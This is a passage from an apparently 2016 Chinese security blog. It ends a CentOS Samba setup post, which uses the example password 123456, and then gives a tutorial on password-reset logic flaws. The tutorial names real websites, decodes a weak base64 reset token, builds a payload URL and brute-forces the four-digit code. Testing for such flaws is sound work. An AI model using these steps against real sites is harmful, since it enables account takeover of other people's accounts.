：wq</div></pre></td></tr></table></figure></p>
<p><strong>五、添加用户访问linux共享目录rise</strong><br><figure class="highlight plain"><figcaption><span>用户登录终端设为/bin/false(即使之不能登录系</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">统)</div><div class="line">mkdir /home/rise #建立 rise 文件夹</div><div class="line">touch samba.txt #创建测试文档</div><div class="line">useradd it -d /home/rise -s /bin/false</div><div class="line">chown rise:rise /home/rise -R</div></pre></td></tr></table></figure></p>
<p><strong>六将用户rise添加入到Samba用户数据库，并设置登录共享目录的密码</strong><br><figure class="highlight plain"><figcaption><span>-a rise</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">New SMB password: 输入该用户用于登录 Samba 的密码</div><div class="line">Retype new SMB password: 再次确认输入该密码</div><div class="line">Added user rise. #特别注意：这里设置的密码是用户登录 Samba 共享目录</div><div class="line">的密码，不是用户登录 linux 系统的密码， 密码设置为 123456</div></pre></td></tr></table></figure></p>
<p><strong>七、重新启动服务</strong><br><figure class="highlight plain"><figcaption><span>restart</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">八在 w window  客户端输入</div><div class="line">\\IP 地址 或者 \\rise #服务器别名</div><div class="line">回车之后，会跳出来登录框，</div><div class="line">输入账号 rise 密码 123456</div><div class="line">即可访问共享目录</div><div class="line">至此，CentOS 6.5 linux samba 服务器配置完成。</div></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cisvif0qw0000lohr8hyal8za" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/centos/">centos</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-逻辑漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/04/逻辑漏洞/" class="article-date">
  <time datetime="2016-08-04T00:58:34.000Z" itemprop="datePublished">2016-08-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/04/逻辑漏洞/">逻辑漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>逻辑漏洞</strong><br>  是一种业务逻辑上的设计缺陷，业务流存在问题。<br>这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。<br>密码重置逻辑漏洞<br>密码找回流程<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/1.png?raw=true" alt="image"></p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/2.png?raw=true" alt="image"></p>
<p>邮箱弱token</p>
<p>密码重置逻辑漏洞 实例<br>1.先用临时邮箱注册一个号<br>2.将这个注册的账号退出<br>3.点登陆下面的找回密码<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/3.png?raw=true" alt="image"><br>4.下一步有输入对应账号的校验码，获取校验码之后，将连接复制，点击下一步，用反向代理进行拦截<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/4.png?raw=true" alt="image"><br>分析一下抓取的包，看一下自己填的校验码在哪里，然后进行爆破验证码</p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/5.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/6.png?raw=true" alt="image"><br>获取到验证码之后改一下返回包，Ok可以放了就可以重置密码啦<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/7.png?raw=true" alt="image"></p>
<p>手机注册<br><a href="http://www.xm030.com/" target="_blank" rel="external">http://www.xm030.com/</a></p>
<p>萌乐网<br>申请到一个账号，然后退出，点击忘记密码，然后就会给你发一个链接,分析一下这个链接</p>
<p><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY2NTYx" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY2NTYx</a><br><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY1NTM4" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;token=aXRtcWdqMTM5NjVAY2hhY3VvLm5ldCY1NTM4</a><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/8.png?raw=true" alt="image"><br>用base64进行解密，发现只有后面的四位是随机的，其他都是自己的邮箱加上&amp;符号，因此只要得到后面四位验证码就可以进行重新设置密码<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/9.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/10.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/11.png?raw=true" alt="image"><br>点击发送链接之后，构造一个payload<br><a href="http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;;token=99999999" target="_blank" rel="external">http://www.menle.com/index.php?m=CustomerService&amp;a=resetPwdEmail&amp;;token=99999999</a><br>抓包进行爆破它的验证码</p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/12.png?raw=true" alt="image"></p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/13.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/14.png?raw=true" alt="image"><br>这个出现正确的之后链接已经失效，要自己写一个代码找到验证码之后就可以不然链接失效</p>
<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/11/15.png?raw=true" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cisvif0xa002mlohrv6yhpr4u" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/04/逻辑漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><a class="page-number" href="page/4/">4</a><a class="extend next" rel="next" href="page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Catégories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="categories/安全/">安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Mot-clés</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/openssl/">openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/ssh密码爆破/">ssh密码爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/webshell/">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/逻辑/">逻辑</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Nuage de mot-clés</h3>
    <div class="widget tagcloud">
      <a href="tags/centos/" style="font-size: 16.67px;">centos</a> <a href="tags/csrf/" style="font-size: 10px;">csrf</a> <a href="tags/github/" style="font-size: 10px;">github</a> <a href="tags/google/" style="font-size: 10px;">google</a> <a href="tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="tags/mysql/" style="font-size: 10px;">mysql</a> <a href="tags/openssl/" style="font-size: 10px;">openssl</a> <a href="tags/redis/" style="font-size: 13.33px;">redis</a> <a href="tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="tags/ssh密码爆破/" style="font-size: 10px;">ssh密码爆破</a> <a href="tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="tags/webshell/" style="font-size: 10px;">webshell</a> <a href="tags/win2003/" style="font-size: 10px;">win2003</a> <a href="tags/xss/" style="font-size: 13.33px;">xss</a> <a href="tags/上传/" style="font-size: 16.67px;">上传</a> <a href="tags/执行/" style="font-size: 13.33px;">执行</a> <a href="tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/流程/" style="font-size: 10px;">流程</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="archives/2016/05/">May 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Articles récents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="2016/09/06/python之弱口令爆破/">python之弱口令爆破</a>
          </li>
        
          <li>
            <a href="2016/08/19/centos6-5安装metasploit/">centos6.5安装metasploit</a>
          </li>
        
          <li>
            <a href="2016/08/18/openssl心脏滴血漏洞/">openssl心脏滴血漏洞</a>
          </li>
        
          <li>
            <a href="2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
          </li>
        
          <li>
            <a href="2016/08/08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 春天的春，晴天的晴<br>
      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="index.html" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'liuqi';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="fancybox/jquery.fancybox.css">
  <script src="fancybox/jquery.fancybox.pack.js"></script>


<script src="js/script.js"></script>

  </div>
</body>
</html>